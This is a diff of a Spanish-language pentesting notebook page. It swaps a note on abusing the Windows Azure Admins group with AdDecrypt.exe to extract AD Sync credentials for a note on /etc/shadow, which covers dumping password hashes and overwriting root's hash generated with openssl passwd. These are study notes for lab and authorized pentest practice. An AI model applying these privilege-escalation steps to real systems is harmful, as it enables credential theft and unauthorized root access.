@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
-    <title>Azure Admins | Notebook</title>
+    <title>Shadow | Notebook</title>
     <script src="/theme.js"></script>
     <link rel="stylesheet" href="/section.css" />
   </head>
@@ -15,9 +15,9 @@
       <section class="notebook-workspace" aria-label="Notebook">
         <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
 
-        <article class="note-panel is-active" id="azure-admins">
+        <article class="note-panel is-active" id="shadow">
           <div class="note-tabbar">
-            <span>Azure Admins</span>
+            <span>Shadow</span>
             <details class="notebook-tag-search">
               <summary>Buscar tags</summary>
               <label>
@@ -26,44 +26,44 @@
               </label>
               <div class="notebook-search-results" aria-live="polite"></div>
             </details>
-            <span>~/notebook/Escalada de Privilegios/Windows/Grupos</span>
+            <span>~/notebook/Escalada de Privilegios/Linux/Credenciales</span>
           </div>
 
           <div class="note-content">
-            <p class="eyebrow">escalada de privilegios / windows / grupos</p>
-            <h2>Azure Admins</h2>
+            <p class="eyebrow">escalada de privilegios / linux / credenciales</p>
+            <h2>Shadow</h2>
 
-            <p><a href="https://github.com/VbScrub/AdSyncDecrypt">Repositorio GitHub</a> <a href="https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip">Payloads.zip</a></p>
+            <p><code>/etc/shadow</code> almacena hashes de contraseñas. Leerlo puede permitir cracking offline; escribirlo puede permitir cambiar credenciales, siempre dentro de un laboratorio o pentest autorizado.</p>
 
+            <aside class="callout warning">
+              <p>Modificar <code>/etc/shadow</code> puede dejar usuarios sin acceso o romper autenticación. En laboratorio, guarda copia antes de tocarlo.</p>
+            </aside>
+
+            <h2>Fichero /etc/shadow</h2>
+            <ul>
+              <li><strong>Permiso de Lectura</strong>: ` Dumpear Hashes de los usuarios</li>
+              <li><strong>Permiso de Escritura</strong>: ` Cambiar la contraseña de cualquier usuario</li>
+            </ul>
             <section class="code-card">
-              <h3>Subir payloads y Ejecutarlo desde esa ruta</h3>
-              <pre><code># Subir payload AdDecrypt.exe
-# Subir payload mcrypt.dll
-cd 'C:\Program Files\Microsoft Azure AD Sync\Bin'
-# Ruta AdDecrypt.exe y mcrypt.dll
-C:\Users\&lt;user&gt;\Desktop\AdDecrypt.exe -FullSQL</code></pre>
+              <h3>Cambiar contraseña a un usuario</h3>
+              <pre><code># Crear contraseña
+openssl passwd -1 -salt abc &lt;password_123&gt;
+
+# Nos devuelve una cadena y lo añadimos en &lt;password_hash&gt; del shadow:
+root:&lt;password_hash&gt;:&lt;id_ultimo_cambio&gt;:&lt;min_dias_poder_cambiar_pass&gt;...:
+
+# Ya podremos acceder al usuario por ssh o con sudo su (password_123)</code></pre>
             </section>
-
-            <figure class="note-figure">
-              <img src="/notebook/assets/obsidian/windows-azure-admins.png" alt="Abuso del grupo Azure Admins" />
-            </figure>
-
-            <h2>Máquinas relacionadas</h2>
-            <div class="notebook-related-links">
-              <a href="/writeups.html?machine=monteverde">Monteverde</a>
-            </div>
 
             <h2>Tags</h2>
             <div class="tag-list">
               <span>notebook</span>
-              <span>windows</span>
+              <span>linux</span>
               <span>privesc</span>
               <span>escalada_privilegios</span>
-              <span>grupos</span>
-              <span>active_directory</span>
-              <span>azure</span>
-              <span>admins</span>
-              <span>azure_admins</span>
+              <span>credenciales</span>
+              <span>shadow</span>
+              <span>hashes</span>
             </div>
           </div>
         </article>
